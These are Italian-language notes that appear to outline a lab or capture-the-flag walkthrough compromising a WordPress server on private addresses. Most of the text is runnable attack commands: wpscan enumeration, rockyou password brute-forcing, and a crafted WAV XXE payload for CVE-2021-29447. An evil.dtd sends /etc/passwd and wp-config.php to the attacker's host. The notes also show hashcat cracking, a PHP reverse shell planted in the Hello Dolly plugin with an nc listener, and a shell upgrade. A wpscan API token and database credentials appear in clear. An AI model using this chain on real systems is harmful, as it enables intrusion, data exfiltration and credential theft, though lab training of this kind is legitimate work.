0: crea un account https://wpscan.com/profile/ e salvati l'API key

nano ~/.wpscan/scan.yml

e inserisci

cli_options:
  api_token: 'LfDI0H8k08OjPPSBBsUusAPwSENCFQt1hDyqeY0EQoA'

1: entra sulla pagina con l'ip fornito da browser.

2: Valuta se wp-admin è esposto (come si fa a non esporre?)

3: Scan vulnerabilità aggerssivo
wpscan --url http://10.80.128.91 -e vp,vt --plugins-detection aggressive

noto che la prima trovata è https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447

**leggere e spiegare la cve**

4: Per sfruttarla devo entrare nel pannello admin, quindi Brutefoce pwd (aggiungi "test") 
wpscan --url http://10.82.130.18 -U test-corp -P /usr/share/wordlists/rockyou.txt

Password trovata. Entriamo e diamo un'occhiata (media è vulnerabile)

5: Per prima cosa mi lancio un server in ascolto così da averne l'indirizzo
php -S 0.0.0.0:1234

6: mi serve un payload. So che il plugin di wp è vulnerabile alle iniezioni xml.
So che lo standard WAV supporta un chink chiamato iXML per i metadati. Solo che io furbescamente lo userò per dire al parser XML "ehi, per capire cosa c'è scritto devi scaricare le istruzioni da qui (mio server). 

nano poc.wav
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.82.74.94:1234/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

Però non possiamo vedere l'output del parsing XML direttamente sulla pagina, quindi sul mio server creerò un file .dtd (da verificare) con le istruzioni per l'esfiltrazione.

cat > evil.dtd <<EOF
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.82.74.94:1234/?p=%file;'>" >
EOF

** spiegone **

7. Carico il .wav in media e osservo il serer python che ho aperto.

Ciò che mi ritorna è in base64, lo decodifico con cyberchef.


8. Bene, vedo **qualcosa**, ora posso approfondire cercando wp-config.php:

cat > evil.dtd <<EOF
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.82.74.94:1234/?p=%file;'>" >
EOF


9. Trovato, ora posso accedere al database

/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb2' );

/** MySQL database username */
define( 'DB_USER', 'thedarktangent' );

/** MySQL database password */
define( 'DB_PASSWORD', 'sUp3rS3cret132' );


a. mysql -u thedarktangent -p -h 10.82.187.226
b. use wordpressdb2;
c. select * from wptry_users;

10. Ottimo, vedo usernames e password hashate, verifico l'algoritmo con hash-identifier.

11. Vedo che è md5, metto al lavoro hashcat
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt

risultato corp-001:teddybear

12. Loggiamoci a wp con le nuove credenziali

13. Ora proseguiamo impiantando una reverse shell, scarica da
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php modificando i parametri (ip mia macchina e porta inutilizzata, tipo 4444)

14. Andiamo su plugin, vedo che Hello Dolly è disattivato. Provo a modificarlo in plugin editor, ci incollo la shell.
Prima di cliccare su activate, lancio nc -lvnp 4444.

15. Una volta attivato, navigo su 
http://10.82.187.226/wp-content/plugins/hello.php e voilà, in netcat mi appare la reverse shell.

16. Cerco la flag con find / -name flag.txt 2>/dev/null **spiegone**
e infine recupero la flag cat /home/stux/flag/flag.txt


17. Mostro su shodan la cve in questione


BONUS:
la shell ha permessi limitati, usiamo questo script python
python3 -c 'import pty; pty.spawn("/bin/bash")' **spiegone**

poi, Ctrl+Z

poi stty raw -echo; fg

poi "invio"

poi reset

poi xterm

